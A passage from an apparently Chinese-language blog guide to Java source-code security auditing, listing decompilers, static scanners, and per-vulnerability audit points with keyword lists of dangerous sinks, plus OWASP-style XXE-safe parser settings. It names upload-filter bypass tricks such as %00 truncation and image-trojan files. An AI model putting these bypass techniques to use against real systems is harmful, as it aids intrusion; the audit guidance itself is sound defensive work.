1.JD-GUI：是一款具有UI界面的反编译工具，界面简洁大方，使用简单方便。</span><br><span class="line">2.Fernflower：功能比JD-GUI更强大，虽然没有UI界面，但可以配合系统指令完成批量反编译的工作。</span><br><span class="line">3.CFR：功能强大的反编译工具，支持主流Java特性——Java 8 lambda表达式，以及Java 7字符串切换。在某些JD-GUI无法反编译的情况下，CFR仍然能完美地进行反编译，也可以像FernFlower那样配合系统指令进行批量反编译。</span><br><span class="line">4.IntelliJ IDEA：具能够自动解包已添加依赖的Jar包，并对其内容进行反编译。该工具拥有强大的动态调试和字符串匹配和搜索功能，为审计和调试漏洞的工作提供了极大便利。</span><br><span class="line">四、Java代码静态扫描工具</span><br><span class="line">1.Fortify SCA：获得业界认可的静态代码检查工具，但它是收费的。Fortify SCA的核心在于规则库，用户可以自定义规则库，减少误报。</span><br><span class="line">2.VCG：基于 VB 开发的一款Windows下的白盒审计工具。VCG 支持多种语言，例如C/C++、Java、C#、VB、PL/SQL、PHP。VCG会根据代码中的变量名等信息动态生成针对该代码的漏洞规则，通过正则检查是否有和漏洞规则所匹配的代码。</span><br><span class="line">3.FindBugs与FindSecBugs插件：FindBugs是一款Bug扫描插件，在IDEA和Eclipse中都可进行安装。FindBugs可以帮助开发人员发现代码缺陷，减少Bug，但其本身并不具备发现安全漏洞的能力，需要安装FindSecBugs拓展发现安全漏洞的能力。</span><br><span class="line">4.SpotBugs：是FindBugs的继任者，所以二者用法基本一样，可以独立使用，也可以作为插件使用。</span><br><span class="line">5.CheckMark：白盒代码审计解决方案，主要通过采用独特的词汇分析技术和CxQL专利查询技术对应用程序源码进行静态分析检查。</span><br><span class="line">6.Snyk插件：修复项目中的安全漏洞、基础架构错误配置和代码质量问题。</span><br><span class="line">7.Sensei插件：可在键入时扫描和修复易受攻击的代码 - 具有数百个可下载的安全编码配方（规则）以及内置的自行制作能力。</span><br><span class="line">8.Reshift Security插件：可以快速发现漏洞，提供多个代码修复片段，以及丰富的文档，涵盖了每个漏洞的检测、修复和测试。</span><br><span class="line">9.MurphySec Code Scan插件：可以快速识别您的项目中使用了哪些存在安全缺陷的开源组件，并帮助您一键修复问题。</span><br><span class="line">10.Momo Code Sec Inspector插件：重于在编码过程中发现项目潜在的安全风险，并提供一键修复能力。</span><br><span class="line">11.dependence-check：可用于检查已发布安全漏洞的项目依赖项。</span><br><span class="line">12.wJa：一款结合DAST、SAST、IAST的综合性应用程序安全分析工具，支持对java web程序的安全性进行分析，含有反编译，代码审计，调试jar包，代理追踪等用于分析软件安全的功能。</span><br><span class="line">13.tabby：是一款针对Java语言的静态代码分析工具，它使用静态分析框架 Soot 作为语义提取工具，将JAR/WAR/CLASS文件转化为代码属性图，并使用 Neo4j 图数据库来存储生成的代码属性图CPG。</span><br><span class="line">14.SpringInspector：Java自动代码审计工具，尤其针对Spring框架，提供一个SpringBoot的Jar包即可进行自动代码审计，底层技术基于字节码分析。</span><br><span class="line">15.gadgetinspector：反序列化漏洞利用链、漏洞检测工具。</span><br></pre></td></tr></table></figure><h3 id="常见漏洞"><a href="#常见漏洞" class="headerlink" title="常见漏洞"></a>常见漏洞</h3><h4 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h4><p>审计的注意点</p><ul><li>是否使用预编译技术，预编译是否完整。</li><li>定位SQL语句上下文，查看是否有参数直接拼接，是否有对模糊查询关键字的过滤。</li><li>Mybatis框架则搜索${}，四种情况无法预编译：like模糊查询、order by排序、范围查询in、动态表名&#x2F;列名，只能拼接，所以还是需要手工防注入，此时可查看相关逻辑是否正确。</li><li>JPA搜索<code>JpaSort.unsafe()</code>，查看是否用实体之外的字段对查询结果排序，进行了SQL的拼接。以及查看<code>EntityManager</code>的使用，也可能存在拼接SQL的情况。</li></ul><p>关键函数或字符串查找</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Statement</span><br><span class="line">createStatement</span><br><span class="line">PrepareStatement</span><br><span class="line">like &#x27;%$&#123;</span><br><span class="line">in($&#123;</span><br><span class="line">select</span><br><span class="line">update</span><br><span class="line">insert</span><br><span class="line">delete</span><br><span class="line">$&#123;</span><br><span class="line">setObject(</span><br><span class="line">setInt(</span><br><span class="line">setString(</span><br><span class="line">setSQLXML(</span><br><span class="line">createQuery(</span><br><span class="line">createSQLQuery(</span><br><span class="line">createNativeQuery(</span><br></pre></td></tr></table></figure><h4 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h4><p>审计的注意点</p><ul><li>定位用户的输入输出，梳理数据交互以及前端展示的过程</li><li>找到一条完整的利用链之后，就是结合现有的安全措施（输出编码、过滤器等）进行判断，例如是否存在绕过的可能，或者是没有任何安全防护可直接造成攻击。</li><li>扫描所有的 HttpServletRequest 查看相关的上下文环境。</li></ul><p>关键函数或字符串查找</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">request.getParamter</span><br><span class="line">&lt;%=</span><br><span class="line">param</span><br><span class="line">$&#123;</span><br><span class="line">&lt;c:out</span><br><span class="line">&lt;c:if</span><br><span class="line">&lt;c:forEach</span><br><span class="line">ModelAndView</span><br><span class="line">ModeMap</span><br><span class="line">Model</span><br><span class="line">request.setAttribute</span><br><span class="line">response.getWrite().print(</span><br><span class="line">response.getWrite().writer(</span><br><span class="line">XssFilter</span><br><span class="line">org.springframework.web.util.HtmlUtils</span><br><span class="line">org.apache.commons.lang3.StringEscapeUtils</span><br><span class="line">ESAPI.encoder().encodeForHTML</span><br></pre></td></tr></table></figure><h4 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h4><p>审计的注意点</p><ul><li><p>XML 解析一般在导入配置、数据传输接口等场景可能会用到，涉及到 XML 文件处理的场景可留意下 XML 解析器是否禁用外部实体，从而判断是否存在 XXE。</p></li><li><p>XML解析涉及的业务功能点： WebServices接口、RESTful接口、Excel文件解析、Soap协议等。</p></li><li><p>计XML解析器是否设置了相关的安全属性，禁用DTDs或者禁止使用外部实体。还有是否使用了不安全的漏洞组件。</p></li></ul><p>关键函数或字符串查找</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">javax.xml.parsers.DocumentBuilder</span><br><span class="line">javax.xml.parsers.DocumentBuilderFactory</span><br><span class="line">javax.xml.stream.XMLStreamReader</span><br><span class="line">javax.xml.stream.XMLInputFactory</span><br><span class="line">org.jdom.input.SAXBuilder</span><br><span class="line">org.jdom2.input.SAXBuilder</span><br><span class="line">org.jdom.output.XMLOutputter</span><br><span class="line">oracle.xml.parser.v2.XMLParser</span><br><span class="line">javax.xml.parsers.SAXParser</span><br><span class="line">org.dom4j.io.SAXReader </span><br><span class="line">org.dom4j.DocumentHelper</span><br><span class="line">org.xml.sax.XMLReader</span><br><span class="line">javax.xml.transform.sax.SAXSource </span><br><span class="line">javax.xml.transform.TransformerFactory </span><br><span class="line">javax.xml.transform.sax.SAXTransformerFactory </span><br><span class="line">javax.xml.validation.SchemaFactory</span><br><span class="line">javax.xml.validation.Validator</span><br><span class="line">javax.xml.bind.Unmarshaller</span><br><span class="line">javax.xml.xpath.XPathExpression</span><br><span class="line">java.beans.XMLDecoder</span><br></pre></td></tr></table></figure><p>部分XML解析器的正确禁用方式，参考：<a href="https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet#Java">https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet#Java</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">XMLInputFactory (a StAX parser)</span><br><span class="line">xmlInputFactory.setProperty(XMLInputFactory.SUPPORT_DTD, false); // This disables DTDs entirely for that </span><br><span class="line">factory</span><br><span class="line">xmlInputFactory.setProperty(&quot;javax.xml.stream.isSupportingExternalEntities&quot;, false); // disable external entities</span><br><span class="line"></span><br><span class="line">TransformerFactory</span><br><span class="line">TransformerFactory tf = TransformerFactory.newInstance();</span><br><span class="line">tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, &quot;&quot;);</span><br><span class="line">tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, &quot;&quot;);</span><br><span class="line"></span><br><span class="line">Validator</span><br><span class="line">SchemaFactory factory = SchemaFactory.newInstance(&quot;http://www.w3.org/2001/XMLSchema&quot;);</span><br><span class="line">Schema schema = factory.newSchema();</span><br><span class="line">Validator validator = schema.newValidator();</span><br><span class="line">validator.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, &quot;&quot;);</span><br><span class="line">validator.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, &quot;&quot;);</span><br><span class="line"></span><br><span class="line">SchemaFactory</span><br><span class="line">SchemaFactory factory = SchemaFactory.newInstance(&quot;http://www.w3.org/2001/XMLSchema&quot;);</span><br><span class="line">factory.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, &quot;&quot;);</span><br><span class="line">factory.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, &quot;&quot;);</span><br><span class="line">Schema schema = factory.newSchema(Source);</span><br><span class="line"></span><br><span class="line">SAXTransformerFactory</span><br><span class="line">SAXTransformerFactory sf = SAXTransformerFactory.newInstance();</span><br><span class="line">sf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, &quot;&quot;);</span><br><span class="line">sf.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, &quot;&quot;);</span><br><span class="line">sf.newXMLFilter(Source);</span><br><span class="line">//Note: Use of the following XMLConstants requires JAXP 1.5, which was added to Java in 7u40 and Java 8:</span><br><span class="line">javax.xml.XMLConstants.ACCESS_EXTERNAL_DTD</span><br><span class="line">javax.xml.XMLConstants.ACCESS_EXTERNAL_SCHEMA</span><br><span class="line">javax.xml.XMLConstants.ACCESS_EXTERNAL_STYLESHEET</span><br><span class="line"></span><br><span class="line">XMLReader</span><br><span class="line">XMLReader reader = XMLReaderFactory.createXMLReader();</span><br><span class="line">reader.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);</span><br><span class="line">reader.setFeature(&quot;http://apache.org/xml/features/nonvalidating/load-external-dtd&quot;, false); // This may </span><br><span class="line">not be strictly required as DTDs shouldn&#x27;t be allowed at all, per previous line.</span><br><span class="line">15 / 28</span><br><span class="line">reader.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);</span><br><span class="line">reader.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);</span><br><span class="line"></span><br><span class="line">SAXReader</span><br><span class="line">saxReader.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);</span><br><span class="line">saxReader.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);</span><br><span class="line">saxReader.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);</span><br><span class="line">//Based on testing, if you are missing one of these, you can still be vulnerable to an XXE attack.</span><br><span class="line"></span><br><span class="line">SAXBuilder</span><br><span class="line">SAXBuilder builder = new SAXBuilder();</span><br><span class="line">builder.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;,true);</span><br><span class="line">builder.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);</span><br><span class="line">builder.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);</span><br><span class="line">Document doc = builder.build(new File(fileName));</span><br><span class="line"></span><br><span class="line">Unmarshaller</span><br><span class="line">SAXParserFactory spf = SAXParserFactory.newInstance();</span><br><span class="line">spf.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);</span><br><span class="line">spf.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);</span><br><span class="line">spf.setFeature(&quot;http://apache.org/xml/features/nonvalidating/load-external-dtd&quot;, false);</span><br><span class="line">Source xmlSource = new SAXSource(spf.newSAXParser().getXMLReader(), new InputSource(new StringReader(xml)));</span><br><span class="line">JAXBContext jc = JAXBContext.newInstance(Object.class);</span><br><span class="line">Unmarshaller um = jc.createUnmarshaller();</span><br><span class="line">um.unmarshal(xmlSource);</span><br><span class="line"></span><br><span class="line">XPathExpression</span><br><span class="line">DocumentBuilderFactory df = DocumentBuilderFactory.newInstance();</span><br><span class="line">df.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, &quot;&quot;); </span><br><span class="line">df.setAttribute(XMLConstants.ACCESS_EXTERNAL_SCHEMA, &quot;&quot;); </span><br><span class="line">DocumentBuilder builder = df.newDocumentBuilder();</span><br><span class="line">String result = new XPathExpression().evaluate( builder.parse(new </span><br><span class="line">ByteArrayInputStream(xml.getBytes())) );</span><br></pre></td></tr></table></figure><h4 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h4><p>审计的注意点</p><ul><li>反序列化操作的功能位置：导入模版文件、网络通信、数据传输、日志格式化存储、对象数据落磁盘或DB存储等业务场景。</li><li>可以通过对网络抓包寻找序列化数据：java序列化的数据一般会以标记（ac ed 00 05）开头，base64编码后的特征为rO0AB。</li><li>查看反序列化触发点的参数是否由用户可控。</li><li>全局查找implements Serializable 的所有内部类。</li><li>程序中存在一条可以产生安全问题的利用链，如远程代码执行，并找到一个可以触发利用链的点。</li></ul><p>关键函数或字符串查找</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject</span><br><span class="line">ObjectInputStream.readUnshared</span><br><span class="line">XMLDecoder.readObject</span><br><span class="line">Yaml.load</span><br><span class="line">XStream.fromXML</span><br><span class="line">ObjectMapper.readValue</span><br><span class="line">JSON.parseObject</span><br></pre></td></tr></table></figure><h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><p>审计的注意点</p><ul><li>重点关注能执行命令的一些功能及函数</li></ul><p>关键函数或字符串查找</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().exec()</span><br><span class="line">Process</span><br><span class="line">UNIXProcess</span><br><span class="line">ProcessImpl</span><br><span class="line">ProcessBuilder.start()</span><br><span class="line">GroovyShell.evaluate()</span><br><span class="line">由java后端模板引擎注入导致的 RCE 漏洞，常见的如：Freemarker、Velocity、Thymeleaf等</span><br><span class="line">由java一些脚本语言引起的 RCE 漏洞，常见的如：Groovy、JavascriptEngine等</span><br><span class="line">由第三方开源组件引起的 RCE 漏洞，常见的如：Fastjson、Shiro、Xstream、Struts2、weblogic等</span><br></pre></td></tr></table></figure><h4 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h4><p>审计的注意点</p><ul><li>SSRF 漏洞出现的场景有很多，如在线翻译、转码服务、图片收藏&#x2F;下载、信息采集、邮件系统或者从远程服务器请求资源等。通常我们可 以通过浏览器查看源代码查找是否在本地进行了请求，也可以使用 DNSLog 等工具进行测试网页是否被访问。</li><li>重点关注HTTP请求操作函数。</li><li>想要支持所有的协议，只能使用URLConnection、URL。</li></ul><p>关键函数或字符串查找</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">HttpClient.execute()</span><br><span class="line">HttpClient.executeMethod()</span><br><span class="line">HttpURLConnection.connect()</span><br><span class="line">HttpURLConnection.getInputStream()</span><br><span class="line">URL.openStream()</span><br><span class="line">HttpServletRequest()</span><br><span class="line">BasicHttpEntityEnclosingRequest()</span><br><span class="line">DefaultBHttpClientConnection()</span><br><span class="line">BasicHttpRequest()</span><br><span class="line">ImageIO.read()</span><br><span class="line">Request.Get.execute</span><br><span class="line">Request.Post.execute</span><br><span class="line">OkHttpClient.newCall.execute</span><br><span class="line">com.alibaba.druid.util.HttpClientUtils</span><br><span class="line">javax.servlet.http.HttpServletRequest</span><br><span class="line">java.net.URI</span><br><span class="line">java.net.URL</span><br><span class="line">java.net.URLConnection</span><br><span class="line">com.bea.uddiexplorer.Search</span><br><span class="line">org.apache.commons.httpclient.HttpMethodBase</span><br><span class="line">org.apache.http.client.methods.HttpRequestBase</span><br></pre></td></tr></table></figure><p>除了建立HTTP协议连接，还可能直接通过 Socket建立连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">AsynchronousServerSocketChannel.accept/bind</span><br><span class="line">AsynchronousSocketChannel.write/read/bind/connect</span><br><span class="line">ServerSocketChannel.bind</span><br><span class="line">ServerSocket.accept/bind</span><br><span class="line">Socket.bind/connect</span><br><span class="line">Socket.getInputStream().read</span><br><span class="line">Socket.getOutputStream().write</span><br><span class="line">SocketChannel.bind/read/write/connect</span><br></pre></td></tr></table></figure><h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><p>审计的注意点</p><ul><li>关注文件后缀验证，是使用白名单还是黑名单。</li><li>最好使用<code>lastIndexOf()</code>方法获取文件后缀，如果使用<code>IndexOf()</code>可能被绕过。</li><li>如果是白名单验证时，使用<code>toLowerCase()</code>处理再进行对比，或使用<code>equalsIgnoreCase()</code>，避免被大小写绕过。</li><li>是否校验了文件的大小。</li><li>是否校验了文件类型<code>getContentType()</code>。</li><li>对于使用Hutool的FileTypeUtil的<code>getType()</code>或<code>ImageIO.read()</code>通过读取文件流中前N个byte值来判断文件类型的，也可以使用类似图片马的方式进行绕过。</li><li>尝试”%00”截断能否绕过。</li><li>QP编码特性能否绕过。<code>javax.mail.internet.MimeUtility.encodeWord()</code>方法。</li><li>有一些安全校验的顺序有问题，先将文件保存，再进行安全检测，如果不通过检测则进行删除，此时可以在文件保存后触发报错终止流程，导致不删除文件。</li></ul><p>关键函数或字符串查找</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">FileUpload</span><br><span class="line">FileUploadBase</span><br><span class="line">FileItemIteratorImpl</span><br><span class="line">FileItemStreamImpl</span><br><span class="line">FileUtils</span><br><span class="line">UploadHandleServlet</span><br><span class="line">FileLoadServlet</span><br><span class="line">FileOutputStream</span><br><span class="line">DiskFileItemFactory</span><br><span class="line">MultipartRequestEntity</span><br><span class="line">MultipartFile</span><br><span class="line">com.oreilly.servlet.MultipartRequest</span><br><span class="line">java.io.File</span><br><span class="line">MultipartMethod</span><br><span class="line">MultipartHttpServletRequest</span><br><span class="line">CommonsMutipartResolver</span><br><span class="line">upload</span><br><span class="line">fileNmae</span><br><span class="line">filePath</span><br><span class="line">lastIndexOf</span><br><span class="line">indexOf</span><br><span class="line">FileUpload</span><br><span class="line">getRealPath</span><br><span class="line">getServletPath</span><br><span class="line">getPathInfo</span><br><span class="line">getContentType</span><br><span class="line">equalsIgnoreCase</span><br><span class="line">FileUtils</span><br><span class="line">UploadHandleServlet</span><br><span class="line">FileLoadServlet</span><br><span class="line">getInputStream</span><br><span class="line">DiskFileItemFactory</span><br></pre></td></tr></table></figure><h4 id="任意文件读-x2F-写-x2F-删除-x2F-复制-x2F-移动-x2F-遍历"><a href="#任意文件读-x2F-写-x2F-删除-x2F-复制-x2F-移动-x2F-遍历" class="headerlink" title="任意文件读&#x2F;写&#x2F;删除&#x2F;复制&#x2F;移动&#x2F;遍历"></a>任意文件读&#x2F;写&#x2F;删除&#x2F;复制&#x2F;移动&#x2F;遍历</h4><p>审计的注意点</p><ul><li>首先关注包含这些功能的类和函数</li><li>对传入的路径未做严格的校验，导致攻击者可以自定义路径</li></ul><p>关键函数或字符串查找</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">sun.nio.ch.FileChannelImpl</span><br><span class="line">java.io.File.list/listFiles</span><br><span class="line">java.io.FileInputStream</span><br><span class="line">java.io.FileOutputStream</span><br><span class="line">java.io.FileSystem/Win32FileSystem/WinNTFileSystem/UnixFileSystem</span><br><span class="line">sun.nio.fs.UnixFileSystemProvider/WindowsFileSystemProvider</span><br><span class="line">java.io.RandomAccessFile</span><br><span class="line">sun.nio.fs.CopyFile</span><br><span class="line">sun.nio.fs.UnixChannelFactory</span><br><span class="line">sun.nio.fs.WindowsChannelFactory</span><br><span class="line">java.nio.channels.AsynchronousFileChannel</span><br><span class="line">FileUtil/IOUtil</span><br><span class="line">filePath/download/deleteFile/move/getFile</span><br><span class="line">fileName/filePath</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="URL跳转"><a href="#URL跳转" class="headerlink" title="URL跳转"></a>URL跳转</h4><p>审计的注意点</p><ul><li>用户登录、统一身份认证处，认证完了会通过url&#x3D;的形式跳转到类似操作的页面。</li><li>用户分享、收藏内容后跳转。</li><li>跨域认证授权后进行跳转。</li><li>对于URL跳转漏洞在黑盒测试时主要的关注点为：注意URL中是否带有return、redirect、url、jump、goto、target、link等 参数值，并注意观察后跟的URL地址的具体格式，再构造相应的payload尝试跳转。在白盒审计中我们则会重点关注可以进行URL跳转的相关方法。</li><li>定位可能存在redirect业务的代码段，审计跳转的URL是否来自于前端参数，是否具有校验和限制。</li></ul><p>关键函数或字符串查找</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sendRedirect</span><br><span class="line">setHeader</span><br><span class="line">forward</span><br><span class="line">redirect:</span><br><span class="line">&lt;c:redirect</span><br><span class="line">self.location.href</span><br><span class="line">location.href</span><br><span class="line">windows.location.href</span><br><span class="line">redirect、redirect_do、redirect_url、url、jump、jump_to、target、to、link、domain</span><br></pre></td></tr></table></figure><h4 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h4><p>审计的注意点</p><ul><li>重点审计系统使用的框架、组件，根据经验查看配置，配置是否有误、是否将调试功能正式上线到生产环境中等。</li><li>由于配置不当或使用有误，将可能导致泄露服务器的敏感信息。<br>例如：swagger 接口文档、Hystrix 监控面板、DWR 框架、Actuator、druid监控平台等等。</li></ul><p>关键函数或字符串查找</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">SwaggerConfig </span><br><span class="line">Swagger2Config </span><br><span class="line">@EnableSwaggerBootstrapUI</span><br><span class="line">@EnableSwagger2</span><br><span class="line">application.properties或者application.yml：swagger.production=true或swagger.basic.enable=true</span><br><span class="line">Hystrix</span><br><span class="line">spring.datasource.druid.stat-view-servlet.enabled=false（false禁用，true开启）</span><br><span class="line">spring.datasource.druid.stat-view-servlet.enabled=true</span><br><span class="line">spring.datasource.druid.stat-view-servlet.login-username=</span><br><span class="line">spring.datasource.druid.stat-view-servlet.login-password=</span><br><span class="line">endpoints.enabled = false</span><br><span class="line">endpoints:</span><br><span class="line">management:</span><br></pre></td></tr></table></figure><h4 id="代码执行-x2F-表达式执行"><a href="#代码执行-x2F-表达式执行" class="headerlink" title="代码执行&#x2F;表达式执行"></a>代码执行&#x2F;表达式执行</h4><p>审计的注意点</p><ul><li>重点审计具有加载类、反序列化类、对类字节码进行操作的功能和代码</li></ul><p>关键函数或字符串查找</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">eval</span><br><span class="line">classLoader</span><br><span class="line">$$BCEL$$</span><br><span class="line">ServiceLoader</span><br><span class="line">ToolProvider.getSystemJavaCompiler()</span><br><span class="line">getSystemClassLoader</span><br><span class="line">JavaFileObject</span><br><span class="line">JdbcRowSetImpl</span><br><span class="line">TemplatesImpl</span><br><span class="line">TransformerFactoryImpl</span><br><span class="line">resolveClass</span><br><span class="line">loadClass</span><br><span class="line">javax.el.ELProcessor</span><br><span class="line">SpelExpressionParser</span><br></pre></td></tr></table></figure><h4 id="Zip文件提取"><a href="#Zip文件提取" class="headerlink" title="Zip文件提取"></a>Zip文件提取</h4><p>审计的注意点</p><ul><li>重点主要关注应用是否存在ZIP解压缩功能</li></ul><p>关键函数或字符串查找</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">FileInputStream</span><br><span class="line">ZipInputStream</span><br><span class="line">getSize()</span><br><span class="line">ZipEntry</span><br></pre></td></tr></table></figure><h4 id="业务逻辑漏洞"><a 